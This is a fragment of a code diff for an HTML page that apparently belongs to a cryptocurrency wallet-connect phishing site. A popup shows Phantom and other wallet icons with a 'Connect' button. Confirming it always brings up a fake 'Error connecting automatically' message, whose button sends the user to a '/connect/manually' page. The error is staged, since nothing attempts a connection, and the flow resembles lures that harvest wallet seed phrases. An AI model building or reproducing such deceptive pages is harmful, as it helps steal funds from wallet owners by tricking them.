+                <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDgiIGhlaWdodD0iMTA4IiB2aWV3Qm94PSIwIDAgMTA4IDEwOCIgZmlsbD0ibm9uZSI+CjxyZWN0IHdpZHRoPSIxMDgiIGhlaWdodD0iMTA4IiByeD0iMjYiIGZpbGw9IiNBQjlGRjIiLz4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik00Ni41MjY3IDY5LjkyMjlDNDIuMDA1NCA3Ni44NTA5IDM0LjQyOTIgODUuNjE4MiAyNC4zNDggODUuNjE4MkMxOS41ODI0IDg1LjYxODIgMTUgODMuNjU2MyAxNSA3NS4xMzQyQzE1IDUzLjQzMDUgNDQuNjMyNiAxOS44MzI3IDcyLjEyNjggMTkuODMyN0M4Ny43NjggMTkuODMyNyA5NCAzMC42ODQ2IDk0IDQzLjAwNzlDOTQgNTguODI1OCA4My43MzU1IDc2LjkxMjIgNzMuNTMyMSA3Ni45MTIyQzcwLjI5MzkgNzYuOTEyMiA2OC43MDUzIDc1LjEzNDIgNjguNzA1MyA3Mi4zMTRDNjguNzA1MyA3MS41NzgzIDY4LjgyNzUgNzAuNzgxMiA2OS4wNzE5IDY5LjkyMjlDNjUuNTg5MyA3NS44Njk5IDU4Ljg2ODUgODEuMzg3OCA1Mi41NzU0IDgxLjM4NzhDNDcuOTkzIDgxLjM4NzggNDUuNjcxMyA3OC41MDYzIDQ1LjY3MTMgNzQuNDU5OEM0NS42NzEzIDcyLjk4ODQgNDUuOTc2OCA3MS40NTU2IDQ2LjUyNjcgNjkuOTIyOVpNODMuNjc2MSA0Mi41Nzk0QzgzLjY3NjEgNDYuMTcwNCA4MS41NTc1IDQ3Ljk2NTggNzkuMTg3NSA0Ny45NjU4Qzc2Ljc4MTYgNDcuOTY1OCA3NC42OTg5IDQ2LjE3MDQgNzQuNjk4OSA0Mi41Nzk0Qzc0LjY5ODkgMzguOTg4NSA3Ni43ODE2IDM3LjE5MzEgNzkuMTg3NSAzNy4xOTMxQzgxLjU1NzUgMzcuMTkzMSA4My42NzYxIDM4Ljk4ODUgODMuNjc2MSA0Mi41Nzk0Wk03MC4yMTAzIDQyLjU3OTVDNzAuMjEwMyA0Ni4xNzA0IDY4LjA5MTYgNDcuOTY1OCA2NS43MjE2IDQ3Ljk2NThDNjMuMzE1NyA0Ny45NjU4IDYxLjIzMyA0Ni4xNzA0IDYxLjIzMyA0Mi41Nzk1QzYxLjIzMyAzOC45ODg1IDYzLjMxNTcgMzcuMTkzMSA2NS43MjE2IDM3LjE5MzFDNjguMDkxNiAzNy4xOTMxIDcwLjIxMDMgMzguOTg4NSA3MC4yMTAzIDQyLjU3OTVaIiBmaWxsPSIjRkZGREY4Ii8+Cjwvc3ZnPg==" style="width: 20px; height: auto; margin-right: 10px;">
+                <img src="https://play-lh.googleusercontent.com/waPoKLrd8VeNAmRt6Nv0k4Dph8NHkMjqnreU9UHBKwhLCs_02C7yq4P5k0ebd0G6qZw" style="width: 20px; height: auto; margin-right: 10px;">
+                <img src="https://play-lh.googleusercontent.com/EhgMPJGUYrA7-8PNfOdZgVGzxrOw4toX8tQXv-YzIvN6sAMYFunQ55MVo2SS_hLiNm8" style="width: 20px; height: auto; margin-right: 10px;">
+                <img src="https://play-lh.googleusercontent.com/wjRjMDJ0GJDURRVhHeJ9GvBs171vfUuW1chLMPqeqHqB3o5LBQHWjYmt--eGwej4Ng" style="width: 20px; height: auto; margin-right: 10px;">
+                `,
+        confirmButtonText: "Connect",
+        confirmButtonColor: "#347deb"
+      }).then((result) => {
+        if (result.isConfirmed){
+          Swal.fire({
+            icon: "error",
+            title: `<p style="color: red;">Error</p>`,
+            html: `
+                <p style="font-size: 15px; color: red;">Error connecting automatically</p>
+                <div style="display: flex; justify-content: center; align-items: center;">
+                <img src="https://moralis.io/wp-content/uploads/2023/11/Phantom-Wallet.png" style="width: 30px; height: auto; margin-right: 10px;">
+                <img src="https://play-lh.googleusercontent.com/waPoKLrd8VeNAmRt6Nv0k4Dph8NHkMjqnreU9UHBKwhLCs_02C7yq4P5k0ebd0G6qZw" style="width: 30px; height: auto; margin-right: 10px;">
+                <img src="https://play-lh.googleusercontent.com/EhgMPJGUYrA7-8PNfOdZgVGzxrOw4toX8tQXv-YzIvN6sAMYFunQ55MVo2SS_hLiNm8" style="width: 30px; height: auto; margin-right: 10px;">
+                <img src="https://play-lh.googleusercontent.com/wjRjMDJ0GJDURRVhHeJ9GvBs171vfUuW1chLMPqeqHqB3o5LBQHWjYmt--eGwej4Ng" style="width: 30px; height: auto; margin-right: 10px;">
+                `,
+            confirmButtonText: `<a style="text-decoration: none; color: #ffffff;" href="/connect/manually">Connect manually</a>`,
+            confirmButtonColor: "#347deb"
+          })
+        }
+      })
+    }
+  </script>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
